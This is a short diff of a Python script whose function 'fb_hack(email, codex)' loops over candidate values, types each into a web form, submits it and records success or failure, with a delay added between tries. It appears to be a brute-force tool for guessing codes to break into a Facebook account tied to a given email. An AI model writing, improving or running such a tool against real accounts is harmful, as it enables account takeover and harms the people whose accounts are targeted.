@@ -129,16 +129,17 @@ def fb_hack(email, codex):
       try:
         browser.select_form(nr=0)
         browser.set_value(str(y), nr=5)
-        """forms = list(browser.forms())
-        form = forms[0]
-        print(form)"""
         browser.submit()
-        print(str(y), end='\r')
+        forms = list(browser.forms())
+        form = forms[0]
+        print(form)
+        browser.submit()
         fail = (y, "failed")
         success = (y, "succeded")
         s = " "
-        reset -= 1
-        reset1 = reset
+        print(str(y), end='\r')
+        reset1 = attempt
+        sleepy(30)
       except:
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
